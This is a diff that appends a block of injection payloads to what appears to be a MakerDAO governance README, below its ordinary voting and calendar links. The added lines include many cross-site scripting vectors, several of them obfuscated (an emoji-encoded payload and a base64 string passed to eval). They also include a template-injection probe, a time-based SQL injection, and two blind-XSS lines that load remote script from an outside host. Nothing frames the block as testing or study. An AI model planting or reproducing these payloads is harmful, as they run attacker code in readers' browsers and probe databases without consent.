@@ -54,3 +54,36 @@ If you are new to voting in the Maker Protocol, please see the [voting guide](ht
 Additional information about the Governance process can be found in the [Maker Operational Manual](https://manual.makerdao.com).
 
 To add current and upcoming votes to your calendar, please see the [MakerDAO Governance Calendar](https://manual.makerdao.com/makerdao/calendars/governance-calendar).
+
+
+
+%26gt;%26quot;%26lt;"';}}“></SCRIPT><img src=x onerror=alert(69)>${{7*7}}
+
+"><svg/onload=alert()>
+
+<A%20HRef="%20AutoFocus%20Onfocus=top[%60ale$%7B%27rt%27%7D%60](1)>&x=x
+
+
+</script>"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzhyYmM2dTlreGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+
+<svg><use><set attributeName="href"
+to="data:image/svg+xml,&lt;svg id='x'
+xmlns='http://www.w3.org/2000/svg'&gt;&lt;image
+href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
+
+jafewi2915@apxby.com
+<img%00x src='x' onscrollend='alert(1)'  'style="display:block;overflow:auto;border:1px dashed;width:700px;height:500px;"><span id=x>XSS</span></xss>
+
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+
+
+"><script src=https://js.rip/8rbc6u9kxc></script>
+
+j&#97v&#97script
+
+
+<img src=x onerror=" ℹ️='',ℹ️ℹ️=!ℹ️+ℹ️,ℹ️ℹ️ℹ️=!ℹ️ℹ️+ℹ️,ℹ️ℹ️ℹ️ℹ️=ℹ️+{},ℹ️ℹ️ℹ️ℹ️ℹ️=ℹ️ℹ️[ℹ️++],ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️=ℹ️ℹ️[ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️=ℹ️],ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️=++ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️+ℹ️,ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️=ℹ️ℹ️ℹ️ℹ️[ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️+ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️],ℹ️ℹ️[ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️+=ℹ️ℹ️ℹ️ℹ️[ℹ️]+(ℹ️ℹ️.ℹ️ℹ️ℹ️+ℹ️ℹ️ℹ️ℹ️)[ℹ️]+ℹ️ℹ️ℹ️[ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️]+ℹ️ℹ️ℹ️ℹ️ℹ️+ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️+ℹ️ℹ️[ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️]+ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️+ℹ️ℹ️ℹ️ℹ️ℹ️+ℹ️ℹ️ℹ️ℹ️[ℹ️]+ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️][ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️](ℹ️ℹ️ℹ️[ℹ️]+ℹ️ℹ️ℹ️[ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️]+ℹ️ℹ️[ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️]+ℹ️ℹ️ℹ️ℹ️ℹ️ℹ️+ℹ️ℹ️ℹ️ℹ️ℹ️+`(ℹ️)`)()
+ ">
+
+
